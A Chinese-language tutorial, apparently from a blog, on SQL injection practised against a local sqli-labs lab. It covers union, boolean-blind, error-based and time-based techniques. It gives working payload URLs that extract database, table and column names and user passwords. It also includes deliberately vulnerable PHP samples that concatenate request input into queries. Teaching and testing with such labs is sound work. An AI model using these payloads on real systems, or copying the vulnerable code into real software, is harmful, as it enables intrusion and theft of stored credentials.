概述

SQL注入漏洞是owasp发布的top10排行榜里一直排在第一的漏洞，一个严重的sql注入漏洞可能会直接导致一家公司破产。SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损（被脱裤，被删除，甚至整个服务器权限沦陷）。

原理

sql注入的产生需要满足下列两个条件

1.参数用户可控
2.参数带入数据库查询

当传入的id参数为1’时，数据库执行代码如下

select * from users where id = 1'

这不符合数据库语法规范，所以会报错，当传入的等id参数为and 1=1时，执行的sql语句为

select * from users where id = 1 and 1=1

因为id=1为真，1=1也为真，所以页面会返回和id=1相同的结果，当传入参数为and 1=2时，会报错。这就是初步判断存在sql注入的漏洞。

limit的用法

union注入攻击

使用union的前提是能注入，检验过能注入之后，就要使用order by来判断字段的数量了，在sqli-labs-master里，判断如下


发现字段数为3，所以union语句就是

union select 1,2,3

此时可以设置id值为-1，就会返回union select的结果了

返回结果2，3说明2和3的位置可以输入mysql语句，尝试查看数据库名

查到数据库名为security
在得知了数据库之后，就可以使用命令来查询表名了

http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

要注意的是id的值一定是数据库中不存在的id，否则不会执行后面的查询语句，还有单引号不能忘记加上

已知库名和表名，开始查询列名

http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails'--+


最后查询字段值

http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0' union select 1,2,group_concat(password) from security.users--+


还有一条查看所有数据库的命令

http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-1/?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata--+

Boolean注入攻击

代码分析

<?php
$con=mysqli_connect("localhost","root","root","security");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$id = $_GET['id'];
//匹配危险字符串
if (preg_match("/union|sleep|benchmark/i", $id)) {
    exit("no");
}

$result = mysqli_query($con,"select * from users where `id`='".$id."'");

$row = mysqli_fetch_array($result);

if ($row) {
    exit("yes");
}else{
    exit("no");
}

?>

bool注入攻击页面只会回显yes和no，实际操作可能会比较麻烦
判断数据库名的长度

?id=1' and length(database())>=1--+

找到最后返回yes的那个数字，就是数据库名的长度
获取数据库名(a-z,0-9)

id=1' and substr(database(),1,1)='s'--+

用法：substr(string,start,length)。一般比较麻烦的情况下，可以采用暴力破解的方法，用burp抓包，然后修改参数就好了。
查询表名，字段名也应该粘贴在database()的位置

' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+

以此类推，也可以查看其他的表名和字段名

报错注入攻击

代码分析

<?php
$con=mysqli_connect("localhost","root","root","security");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$username = $_GET['username'];

if($result = mysqli_query($con,"select * from users where `username`='".$username."'")){
    echo "ok";
}else{
    echo mysqli_error($con);
}

?>

查询语句

"select * from users where `username`='".$username."'"

当我们输入1’的时候，结果变成了

"select * from users where `username`='1''

从而引发报错
sql语句,查看用户信息

?username=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+

查看数据库名

?username=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

获取表名

' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+

语法updatexml(目标xml文档，xml路径，更新的内容)
concat()的作用是连接字符串

时间注入攻击

代码分析

<?php
$con=mysqli_connect("localhost","root","root","security");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}

$id = $_GET['id'];

if (preg_match("/union/i", $id)) {
    exit("<htm><body>no</body></html>");
}

$result = mysqli_query($con,"select * from users where `id`='".$id."'");

$row = mysqli_fetch_array($result);

if ($row) {
    exit("<htm><body>yes</body></html>");
}else{
    exit("<htm><body>no</body></html>");
}


?>

和bool类型的页面返回类似，也是只有yes和no，但是这个会利用sleep()和benchmark()延长反应的时间，让mysql执行的时间变长

http://127.0.0.1/source%20code/4.2.2/time.php?id=1' and if(length(database())>7,sleep(5),1)--+

这句话的意思是判断数据库名的长度，如果大于七，sleep5秒，否则执行1，通过页面返回的时间判断是不是存在时间注入

http://127.0.0.1/source%20code/4.2.2/time.php?id=1' and if(substr(database(),1,1)='s',sleep(5),1)--+

判断数据库名的第一个字母，如果是s那么sleep5秒，否则执行1
还有一种是通过ASCII值来判断

id=1' and if(ord(substring(user(),1,1))=114,sleep(5),1)--+

‘r’的ASCII值为114，if条件成立，sleep5秒
